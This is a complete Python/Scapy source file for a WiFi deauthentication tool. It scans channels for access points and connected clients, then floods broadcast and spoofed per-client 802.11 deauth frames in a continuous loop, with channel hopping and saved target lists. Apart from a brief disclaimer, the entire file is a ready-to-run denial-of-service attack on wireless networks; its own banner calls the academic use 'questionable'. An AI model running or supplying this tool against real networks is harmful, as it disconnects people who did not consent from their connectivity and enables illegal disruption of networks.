#!/usr/bin/env python3
# ============================================================
#  full-auto.py  –  WiFi Deauthentication Tool
#  Linux only · Python 3 · Scapy · Terminal only
#  Inspired by github.com/flashnuke/wifi-deauth
#
#  ⚠  FOR AUTHORIZED TESTING AND ACADEMIC USE ONLY.
#     Using this tool on networks you do not own or have
#     explicit written permission to test is ILLEGAL.
#     Nese elesez menlik deyil
# ============================================================

import os
from re import purge
import sys
import json
import copy
import signal
import logging
import argparse
import traceback
import threading
import subprocess
from time import sleep, time
from typing import Dict, Generator, List, Union
from collections import defaultdict
from enum import Enum

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.layers.dot11 import (
    RadioTap, Dot11Elt, Dot11Beacon, Dot11ProbeResp,
    Dot11ReassoResp, Dot11AssoResp, Dot11QoS, Dot11Deauth, Dot11,
)
from scapy.all import sniff, sendp, conf, RandMAC, Thread

conf.verb = 0

PURPLE = "\033[35m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"
DIM    = "\033[2m"

DELIM      = f"{DIM}{'─' * 80}{RESET}"
BD_MACADDR = "ff:ff:ff:ff:ff:ff"

BANNER = f"""
{BOLD}{RED}
  ███████╗██╗   ██╗██╗     ██╗       █████╗ ██╗   ██╗████████╗ ██████╗
  ██╔════╝██║   ██║██║     ██║      ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗
  █████╗  ██║   ██║██║     ██║      ███████║██║   ██║   ██║   ██║   ██║
  ██╔══╝  ██║   ██║██║     ██║      ██╔══██║██║   ██║   ██║   ██║   ██║
  ██║     ╚██████╔╝███████╗███████╗ ██║  ██║╚██████╔╝   ██║   ╚██████╔╝
  ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝
{RESET}{DIM}  WiFi Deauthentication Tool  |  Academic (questionable) / Authorized Testing Only{RESET}
"""

SAVED_TARGETS_FILE = os.path.expanduser("~/.wifi_deauth_targets.json")

_print_lock = threading.RLock()
_print_enabled = True


def _safe_print(msg: str, end: str = "\n"):
    if _print_enabled:
        with _print_lock:
            print(msg, end=end, flush=True)


def printf(msg: str = "", end: str = "\n"):   _safe_print(msg, end)
def print_info(msg: str, end: str = "\n"):    _safe_print(f"  {PURPLE}{BOLD}[*]{RESET} {msg}", end)
def print_error(msg: str, end: str = "\n"):   _safe_print(f"  {RED}{BOLD}[!]{RESET} {msg}", end)
def print_cmd(msg: str, end: str = "\n"):     _safe_print(f"  {CYAN}[>]{RESET} {msg}", end)
def print_debug(msg: str, end: str = "\n"):   _safe_print(f"  {DIM}[d]{RESET} {msg}", end)
def print_ok(msg: str, end: str = "\n"):      _safe_print(f"  {GREEN}{BOLD}[✔]{RESET} {msg}", end)

def print_input(prompt: str) -> str:
    with _print_lock:
        return input(f"  {PURPLE}{BOLD}[?]{RESET} {prompt} ").strip()


def clear_line(n: int = 1):
    with _print_lock:
        for _ in range(n):
            print("\033[F\033[K", end="", flush=True)


def get_time() -> int:
    return int(time())


def invalidate_print():
    global _print_enabled
    _print_enabled = False


def restore_print():
    global _print_enabled
    _print_enabled = True

class BandType(Enum):
    T_24GHZ = "2.4 GHz"
    T_50GHZ = "5.0 GHz"


class SSID:
    def __init__(self, name: str, mac_addr: str, band: BandType):
        self.name = name
        self.mac_addr = mac_addr.lower()
        self.band = band
        self.channel = 0
        self.clients: List[str] = []

    def add_channel(self, ch: int):
        self.channel = ch

    def to_dict(self) -> dict:
        return {
            "name":     self.name,
            "mac_addr": self.mac_addr,
            "band":     self.band.value,
            "channel":  self.channel,
        }

    @staticmethod
    def from_dict(d: dict) -> "SSID":
        band = BandType.T_50GHZ if d["band"] == "5.0 GHz" else BandType.T_24GHZ
        s = SSID(d["name"], d["mac_addr"], band)
        s.channel = d["channel"]
        return s


def frequency_to_channel(freq: int) -> int:
    """Convert 802.11 frequency (MHz) to channel number."""
    if freq == 2484:
        return 14
    if 2412 <= freq <= 2472:
        return (freq - 2407) // 5
    if 5160 <= freq <= 5885:
        return (freq - 5000) // 5
    if 5955 <= freq <= 7115:
        return (freq - 5950) // 5 + 1
    return 0

def _load_saved_targets() -> dict:
    if not os.path.exists(SAVED_TARGETS_FILE):
        return {}
    try:
        with open(SAVED_TARGETS_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}


def _write_saved_targets(data: dict):
    with open(SAVED_TARGETS_FILE, "w") as f:
        json.dump(data, f, indent=2)


def cmd_list_targets():
    """--list-targets: print all saved targets and exit."""
    data = _load_saved_targets()
    if not data:
        printf(f"\n  No saved targets found in {BOLD}{SAVED_TARGETS_FILE}{RESET}\n")
        return
    printf(f"\n{DELIM}")
    printf(f"  {BOLD}Saved Targets{RESET}  ({SAVED_TARGETS_FILE})")
    printf(DELIM)
    fmt = f"  {{:<4}} {{:<34}} {{:<20}} {{:<6}} {{}}"
    printf(fmt.format("ID", "SSID", "BSSID", "Ch", "Band"))
    printf(DELIM)
    for idx, (key, entry) in enumerate(data.items(), 1):
        ssid_obj = SSID.from_dict(entry)
        printf(fmt.format(
            f"{PURPLE}{BOLD}{idx}{RESET}",
            ssid_obj.name[:33],
            ssid_obj.mac_addr,
            ssid_obj.channel,
            ssid_obj.band.value,
        ))
    printf(f"{DELIM}\n")


def cmd_delete_target(label: str):
    """--delete-target <name|bssid>: remove a saved target and exit."""
    data = _load_saved_targets()
    key  = label.lower()
    if key not in data:
        # try by name
        found = [k for k, v in data.items() if v["name"].lower() == key]
        if not found:
            print_error(f"Target '{label}' not found in saved list.")
            sys.exit(1)
        key = found[0]
    del data[key]
    _write_saved_targets(data)
    print_ok(f"Target '{label}' deleted from saved list.")


def save_target(ssid_obj: SSID):
    data = _load_saved_targets()
    key  = ssid_obj.mac_addr.lower()
    data[key] = ssid_obj.to_dict()
    _write_saved_targets(data)
    print_ok(f"Target saved  →  {BOLD}{ssid_obj.name}{RESET} "
             f"[{ssid_obj.mac_addr}]  ch {ssid_obj.channel}  ({ssid_obj.band.value})")


def load_target_from_saved(bssid: str) -> Union[SSID, None]:
    data = _load_saved_targets()
    key  = bssid.lower()
    if key in data:
        return SSID.from_dict(data[key])
    return None


def pick_saved_target_interactively() -> Union[SSID, None]:
    """Show saved targets and let user pick one (used with --from-saved)."""
    data = _load_saved_targets()
    if not data:
        return None
    entries = list(data.values())
    printf(f"\n{DELIM}")
    printf(f"  {BOLD}Saved Targets{RESET}")
    printf(DELIM)
    for idx, entry in enumerate(entries, 1):
        s = SSID.from_dict(entry)
        printf(f"  [{PURPLE}{BOLD}{idx:>2}{RESET}]  {s.name:<34} {s.mac_addr:<20} ch {s.channel:<4} {s.band.value}")
    printf(DELIM)
    chosen = -1
    while chosen not in range(1, len(entries) + 1):
        raw = print_input(f"Pick a saved target (1–{len(entries)}):")
        try:
            chosen = int(raw)
        except ValueError:
            print_error("Enter a valid number.")
    return SSID.from_dict(entries[chosen - 1])

class Interceptor:
    _ABORT = False

    _PRINT_STATS_INTV = 1        # seconds between status refresh
    _DEAUTH_INTV      = 0.10     # 100 ms between deauth bursts
    _CH_SNIFF_TO      = 2        # seconds to sniff per channel during scan
    _SSID_STR_PAD     = 42

    def __init__(
        self,
        net_iface:              str,
        skip_monitor_mode:      bool,
        kill_networkmanager:    bool,
        ssid_name:              Union[str, None],
        bssid_addr:             Union[str, None],
        custom_client_macs:     Union[str, None],
        custom_channels:        Union[str, None],
        deauth_all_channels:    bool,
        autostart:              bool,
        save_after_scan:        bool,
        from_saved:             bool,
        debug_mode:             bool,
    ):
        self.interface   = net_iface
        self._debug_mode = debug_mode

        self._max_fail_lim = int(5 / Interceptor._DEAUTH_INTV)
        self._current_channel_num = None
        self._current_channel_aps: set = set()
        self.attack_loop_count = 0
        self.target_ssid: Union[SSID, None] = None

        self._save_after_scan = save_after_scan
        self._from_saved      = from_saved

        # Kill NetworkManager FIRST (before monitor mode, avoids race)
        if kill_networkmanager:
            print_info("Killing NetworkManager…")
            if not self._kill_networkmanager():
                print_error("Failed to kill NetworkManager.")
            sleep(1)  # let it fully release the interface

        # Monitor mode
        if not skip_monitor_mode:
            print_info("Setting up monitor mode…")
            if not self._enable_monitor_mode():
                print_error("Monitor mode was not enabled properly.")
                raise RuntimeError("Unable to enable monitor mode.")
            print_info("Monitor mode active.")
        else:
            print_info("Skipping monitor mode setup.")

        # ── Channel map
        self._channel_range: Dict[int, dict] = {
            ch: defaultdict(dict) for ch in self._get_channels()
        }
        self.log_debug(f"Supported channels: {list(self._channel_range)}")

        # AP storage
        self._all_ssids: Dict[BandType, Dict[str, SSID]] = {
            b: {} for b in BandType
        }

        # Custom filters
        self._custom_ssid_name   = self._parse_custom_ssid(ssid_name)
        self._custom_bssid_addr  = self._parse_custom_bssid(bssid_addr)
        self._custom_client_macs = self._parse_custom_clients(custom_client_macs)
        self._custom_channels    = self._parse_custom_channels(custom_channels)
        self._custom_ap_last_ch  = 0

        # Mid-run output buffer
        self._output_buf: List[str] = []
        self._output_lck = threading.RLock()

        # All-channels mode
        self._deauth_all_channels = deauth_all_channels
        self._ch_gen: Union[Generator, None] = None
        if self._deauth_all_channels:
            self._ch_gen = self._channels_generator()
            print_info(f"Deauth-all-channels mode  →  {BOLD}{GREEN}ON{RESET}")

        self._autostart = autostart

    # Validators

    @staticmethod
    def _parse_custom_ssid(name) -> Union[str, None]:
        if name:
            name = str(name).strip()
            if not name:
                raise ValueError("SSID name cannot be empty.")
        return name or None

    @staticmethod
    def _parse_custom_bssid(addr) -> Union[str, None]:
        if addr:
            try:
                RandMAC(addr)
            except Exception:
                raise ValueError(f"Invalid BSSID address: {addr}")
        return addr.lower() if addr else None

    @staticmethod
    def _parse_custom_clients(raw) -> List[str]:
        result = []
        if raw:
            for mac in raw.split(","):
                mac = mac.strip()
                try:
                    RandMAC(mac)
                    result.append(mac.lower())
                except Exception:
                    raise ValueError(f"Invalid client MAC: {mac}")
        if result:
            print_info(f"Targeting specific clients: {result}")
        else:
            print_info("No specific clients set → broadcast deauth enabled.")
        return result

    def _parse_custom_channels(self, raw) -> List[int]:
        result = []
        if raw:
            try:
                result = [int(c.strip()) for c in raw.split(",")]
            except ValueError:
                raise ValueError(f"Invalid channel list: {raw}")
            for ch in result:
                if ch not in self._channel_range:
                    raise ValueError(
                        f"Channel {ch} not supported by interface "
                        f"(supported: {list(self._channel_range)})"
                    )
        return result

    # System helpers

    def _enable_monitor_mode(self) -> bool:
        cmds = [
            f"ip link set {self.interface} down",
            f"iw {self.interface} set monitor control",
            f"ip link set {self.interface} up",
        ]
        for cmd in cmds:
            print_cmd(f"sudo {cmd}")
            result = subprocess.run(["sudo"] + cmd.split(), shell=False)
            if result.returncode != 0:
                subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"])
                return False
        sleep(2)
        return True

    @staticmethod
    def _kill_networkmanager() -> bool:
        cmd = "systemctl stop NetworkManager"
        print_cmd(cmd)
        result = subprocess.run(["sudo"] + cmd.split(), shell=False)
        return result.returncode == 0

    def _ensure_iface_up(self):
        """Bring interface up if it went down (can happen during channel hops)."""
        RTE = subprocess.run(
            ["ip", "link", "show", self.interface],
            capture_output=True,
            text=True
        )
        ret = "state DOWN" in RTE.stdout
        if "state DOWN" in RTE.stdout:  # interface IS dubenlaylay (down)
            subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"])
            sleep(0.3)

    def _set_channel(self, ch: int):
        self._ensure_iface_up()
        subprocess.run(["iw", "dev", self.interface, "set", "channel", str(ch)], stderr=subprocess.DEVNULL)
        self._ensure_iface_up()  # iw can drop it bcs of sum drivers, so gozde-gulagda ol
        self._current_channel_num = ch

    def _get_channels(self) -> List[int]:
        result = subprocess.run(
            ["iwlist", self.interface, "channel"],
            capture_output=True,
            text=True
        )
        lines = result.stdout.splitlines(keepends=True)
        result = []
        for line in lines:
            line = line.strip()
            if "Channel" in line and "Current" not in line:
                try:
                    result.append(int(line.split("Channel")[1].split(":")[0].strip()))
                except (IndexError, ValueError):
                    pass
        return result or list(range(1, 15))   # fallback 1-14

    def _channel_list(self) -> List[int]:
        return self._custom_channels or list(self._channel_range)

    # Sniff callbacks

    def _ap_sniff_cb(self, pkt):
        try:
            if not (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)):
                return
            ap_mac = str(pkt.addr3).lower()
            raw_ssid = pkt[Dot11Elt].info.strip(b"\x00")
            ssid = raw_ssid.decode("utf-8", errors="replace").strip() or ap_mac
            if ap_mac == BD_MACADDR or not ssid:
                return
            if self._custom_ssid_name and self._custom_ssid_name.lower() not in ssid.lower():
                return
            if self._custom_bssid_addr and ap_mac != self._custom_bssid_addr:
                return
            pkt_ch   = frequency_to_channel(pkt[RadioTap].Channel)
            band     = BandType.T_50GHZ if pkt_ch > 14 else BandType.T_24GHZ
            if ssid not in self._all_ssids[band]:
                self._all_ssids[band][ssid] = SSID(ssid, ap_mac, band)
            self._all_ssids[band][ssid].add_channel(
                pkt_ch if pkt_ch in self._channel_range else self._current_channel_num
            )
            if self._custom_ssid_name:
                self._custom_ap_last_ch = self._all_ssids[band][ssid].channel
            else:
                self._client_sniff_cb(pkt)
        except Exception as e:
            logging.warning(f"Error in _client_sniff_cb: {e}")
    def _client_sniff_cb(self, pkt):
        try:
            if not self._pkt_is_client(pkt):
                return
            ap_mac  = str(pkt.addr3).lower()
            c_mac   = str(pkt.addr1).lower()
            if self.target_ssid and ap_mac == self.target_ssid.mac_addr:
                if c_mac not in [BD_MACADDR, self.target_ssid.mac_addr] \
                        and c_mac not in self.target_ssid.clients:
                    self.target_ssid.clients.append(c_mac)
                    add = not self._custom_client_macs or c_mac in self._custom_client_macs
                    with self._output_lck:
                        self._output_buf.append(
                            f"Client detected {BOLD}{c_mac}{RESET}  →  add to target: "
                            f"{GREEN if add else RED}{add}{RESET}"
                        )
        except Exception as e:
            logging.warning(f"Error in _client_sniff_cb: {e}")

    @staticmethod
    def _pkt_is_client(pkt) -> bool:
        return (
            (pkt.haslayer(Dot11AssoResp)   and pkt[Dot11AssoResp].status   == 0) or
            (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or
            pkt.haslayer(Dot11QoS)
        )

    # Channel scan

    def _scan_channels(self):
        channels = self._channel_list()
        print_info(f"Scanning {len(channels)} channels for APs…")
        if self._custom_ssid_name:
            print_info(f"Targeting SSID  →  {BOLD}{self._custom_ssid_name}{RESET}")
        try:
            for idx, ch in enumerate(channels):
                if (
                    self._custom_ssid_name
                    and self._found_target_ssid()
                    and abs(self._current_channel_num - self._custom_ap_last_ch) > 2
                ):
                    return
                self._set_channel(ch)
                print_info(
                    f"Channel {BOLD}{ch:>3}{RESET}  |  "
                    f"remaining: {len(channels) - idx - 1}",
                    end="\r",
                )
                try:
                    sniff(
                        prn=self._ap_sniff_cb,
                        iface=self.interface,
                        timeout=Interceptor._CH_SNIFF_TO,
                        stop_filter=lambda _p: Interceptor._ABORT,
                    )
                except OSError as e:
                    self.log_debug(f"sniff OSError on ch {ch}: {e} — bringing iface up and retrying")
                    self._ensure_iface_up()
                    sleep(0.5)
                    try:
                        sniff(
                            prn=self._ap_sniff_cb,
                            iface=self.interface,
                            timeout=Interceptor._CH_SNIFF_TO,
                            stop_filter=lambda _p: Interceptor._ABORT,
                        )
                    except OSError:
                        pass  # skip this channel, continue scan
        finally:
            printf()

    def _found_target_ssid(self) -> bool:
        for band_dict in self._all_ssids.values():
            if self._custom_ssid_name in band_dict:
                return True
        return False

    # AP selection

    def _initial_scan_and_select(self) -> SSID:
        self._scan_channels()

        # Populate channel map
        for band_dict in self._all_ssids.values():
            for ssid_name, ssid_obj in band_dict.items():
                self._channel_range[ssid_obj.channel][ssid_name] = copy.deepcopy(ssid_obj)

        target_map: Dict[int, SSID] = {}
        ctr = 0

        printf(f"\n{DELIM}")
        hdr = f"  {'NUM':<5} {'SSID':<36} {'BSSID':<20} {'CH':<5} BAND"
        printf(hdr)
        printf(DELIM)

        for _ch, aps in sorted(self._channel_range.items()):
            for ssid_name, ssid_obj in aps.items():
                ctr += 1
                target_map[ctr] = copy.deepcopy(ssid_obj)
                tag = f"{PURPLE}{BOLD}{ctr:>3}{RESET}"
                printf(
                    f"  [{tag}]  "
                    f"{ssid_obj.name:<36} "
                    f"{ssid_obj.mac_addr:<20} "
                    f"{str(ssid_obj.channel):<5} "
                    f"{ssid_obj.band.value}"
                )

        if not target_map:
            Interceptor.abort_run("No APs found. Quitting.")

        printf(DELIM)

        # Autostart shortcut
        chosen = -1
        if self._autostart:
            if len(target_map) == 1:
                print_info("Autostart: 1 target found, selecting automatically.")
                chosen = 1
            else:
                print_error("Autostart requires exactly 1 result. Use filters to narrow down.")

        while chosen not in target_map:
            raw = print_input(f"Select target [{min(target_map)}-{max(target_map)}]:")
            try:
                chosen = int(raw)
            except ValueError:
                print_error("Please enter a number.")

        return target_map[chosen]

    # Deauth engine

    def _target_clients(self) -> List[str]:
        return self._custom_client_macs or self.target_ssid.clients

    def _send_deauth_client(self, ap_mac: str, cli_mac: str):
        # AP → client
        sendp(
            RadioTap() /
            Dot11(addr1=cli_mac, addr2=ap_mac, addr3=ap_mac) /
            Dot11Deauth(reason=7),
            iface=self.interface,
        )
        # client → AP  (spoofed)
        sendp(
            RadioTap() /
            Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac) /
            Dot11Deauth(reason=7),
            iface=self.interface,
        )

    def _send_deauth_broadcast(self, ap_mac: str):
        sendp(
            RadioTap() /
            Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) /
            Dot11Deauth(reason=7),
            iface=self.interface,
        )

    def _run_deauther(self):
        print_info("Deauth loop started…")
        fails = 0
        ap_mac = self.target_ssid.mac_addr
        while not Interceptor._ABORT:
            try:
                if self._deauth_all_channels:
                    self._set_channel(next(self._ch_gen))
                self.attack_loop_count += 1
                for cli in self._target_clients():
                    self._send_deauth_client(ap_mac, cli)
                if not self._custom_client_macs:
                    self._send_deauth_broadcast(ap_mac)
                fails = 0
            except Exception as exc:
                fails += 1
                if fails >= self._max_fail_lim:
                    Interceptor.abort_run(
                        f"Deauth loop error: {exc}\n{traceback.format_exc()}"
                    )
            sleep(Interceptor._DEAUTH_INTV)

    def _listen_for_clients(self):
        print_info("Client listener thread running…")
        sniff(
            prn=self._client_sniff_cb,
            iface=self.interface,
            stop_filter=lambda _p: Interceptor._ABORT,
        )

    # Status reporter

    def _flush_output_buf(self) -> int:
        with self._output_lck:
            n = len(self._output_buf)
            for line in self._output_buf:
                print_cmd(line)
            self._output_buf.clear()
        if n:
            printf(DELIM)
        return n

    def _report_status(self):
        start = get_time()
        printf(DELIM)
        while not Interceptor._ABORT:
            buf_lines = self._flush_output_buf()
            elapsed   = get_time() - start
            clients   = len(self._target_clients())
            print_info(f"SSID           {BOLD}{self.target_ssid.name:>48}{RESET}")
            print_info(f"BSSID          {self.target_ssid.mac_addr:>48}")
            print_info(f"Channel        {str(self._current_channel_num):>48}")
            print_info(f"Interface      {self.interface:>48}")
            print_info(f"Clients seen   {BOLD}{str(clients):>48}{RESET}")
            print_info(f"Loop count     {BOLD}{str(self.attack_loop_count):>48}{RESET}")
            print_info(f"Elapsed        {BOLD}{str(elapsed) + 's':>48}{RESET}")
            sleep(Interceptor._PRINT_STATS_INTV)
            if Interceptor._ABORT:
                break
            clear_line(7 + buf_lines)

    # Channel generator

    def _channels_generator(self) -> Generator:
        chs = self._channel_list()
        i = 0
        while not Interceptor._ABORT:
            yield chs[i]
            i = (i + 1) % len(chs)

    # Public entry point

    def run(self):
        # Use a saved target if requested
        if self._from_saved:
            restore_print()
            self.target_ssid = pick_saved_target_interactively()
            if self.target_ssid is None:
                print_error("No saved targets found. Run a normal scan first.")
                sys.exit(1)
        else:
            restore_print()
            self.target_ssid = self._initial_scan_and_select()
            if self._save_after_scan:
                save_target(self.target_ssid)

        print_info(f"Target  →  {BOLD}{self.target_ssid.name}{RESET}  [{self.target_ssid.mac_addr}]")        
        printf(f"\n{DELIM}\n")

        threads = [
            Thread(target=self._run_deauther),
            Thread(target=self._listen_for_clients),
            Thread(target=self._report_status),
        ]
        for t in threads:
            t.daemon = True
            t.start()
        for t in threads:
            t.join()

    def log_debug(self, msg: str):
        if self._debug_mode:
            print_debug(msg)

    @staticmethod
    def user_abort(*_):
        Interceptor.abort_run("User interrupt — stopping.")

    @staticmethod
    def abort_run(msg: str):
        if not Interceptor._ABORT:
            Interceptor._ABORT = True
            sleep(Interceptor._PRINT_STATS_INTV * 1.1)
            printf(DELIM)
            print_error(msg)
        sys.exit(0)


# CLI ENTRY POINT


def main():
    signal.signal(signal.SIGINT, Interceptor.user_abort)
    printf(BANNER)
    printf(
        f"  Before running, make sure:\n"
        f"    1. You are running as {RED}{BOLD}root{RESET}\n"
        f"    2. NetworkManager is stopped ({RED}{BOLD}--kill{RESET} flag or manually)\n"
        f"    3. Your wireless adapter supports {RED}{BOLD}monitor mode{RESET}\n"
        f"    4. {RED}{BOLD}You only test networks you own or have permission to test{RESET}\n"
    )
    printf(DELIM)

    if "linux" not in sys.platform:
        print_error(f"Unsupported OS: {sys.platform}. Linux only.")
        sys.exit(1)
    if os.geteuid() != 0:
        print_error("Must be run as root (sudo python3 wifi_deauth.py …)")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description="WiFi Deauthentication Tool",
        formatter_class=argparse.RawTextHelpFormatter,
    )

    # Core
    parser.add_argument("-i", "--iface",
        metavar="IFACE", dest="net_iface", required=False,
        help="Wireless interface (e.g. wlan0). Required unless --list-targets.")

    # Scan filters
    parser.add_argument("-s", "--ssid",
        metavar="SSID", dest="custom_ssid", default=None,
        help="Filter scan by SSID name (case-insensitive).")
    parser.add_argument("-b", "--bssid",
        metavar="BSSID", dest="custom_bssid", default=None,
        help="Filter scan by BSSID/MAC address.")
    parser.add_argument("-c", "--channels",
        metavar="1,6,11", dest="custom_channels", default=None,
        help="Comma-separated list of channels to scan.")
    parser.add_argument("--clients",
        metavar="MAC1,MAC2", dest="custom_clients", default=None,
        help="Only deauth specific client MACs (disables broadcast).")

    # Behaviour
    parser.add_argument("-a", "--autostart",
        action="store_true", default=False, dest="autostart",
        help="Auto-select target when exactly 1 AP is found.")
    parser.add_argument("--deauth-all-channels",
        action="store_true", default=False, dest="deauth_all_channels",
        help="Rotate channels during attack (helps against channel-hopping APs).")
    parser.add_argument("--skip-monitormode",
        action="store_true", default=False, dest="skip_monitormode",
        help="Skip automatic monitor mode setup.")
    parser.add_argument("-k", "--kill",
        action="store_true", default=False, dest="kill_nm",
        help="Kill NetworkManager (recommended).")
    parser.add_argument("-d", "--debug",
        action="store_true", default=False, dest="debug",
        help="Enable verbose debug output.")

    # ── New: save / load targets ──────────────────────────────
    save_grp = parser.add_argument_group("Target persistence (new feature)")
    save_grp.add_argument("--save",
        action="store_true", default=False, dest="save_target",
        help=f"Save the selected AP after scanning to {SAVED_TARGETS_FILE}")
    save_grp.add_argument("--from-saved",
        action="store_true", default=False, dest="from_saved",
        help="Skip scan entirely and pick from previously saved targets.")
    save_grp.add_argument("--list-targets",
        action="store_true", default=False, dest="list_targets",
        help="Print all saved targets and exit.")
    save_grp.add_argument("--delete-target",
        metavar="NAME_OR_BSSID", dest="delete_target", default=None,
        help="Remove a target from the saved list and exit.")

    args = parser.parse_args()

    if args.list_targets:
        cmd_list_targets()
        sys.exit(0)

    if args.delete_target:
        cmd_delete_target(args.delete_target)
        sys.exit(0)

    if not args.net_iface:
        parser.error("argument -i/--iface is required (unless using --list-targets or --delete-target).")

    invalidate_print()   # suppress output during arg parse / setup

    interceptor = Interceptor(
        net_iface           = args.net_iface,
        skip_monitor_mode   = args.skip_monitormode,
        kill_networkmanager = args.kill_nm,
        ssid_name           = args.custom_ssid,
        bssid_addr          = args.custom_bssid,
        custom_client_macs  = args.custom_clients,
        custom_channels     = args.custom_channels,
        deauth_all_channels = args.deauth_all_channels,
        autostart           = args.autostart,
        save_after_scan     = args.save_target,
        from_saved          = args.from_saved,
        debug_mode          = args.debug,
    )
    interceptor.run()


if __name__ == "__main__":
    main()

# burda da vagzali calinir
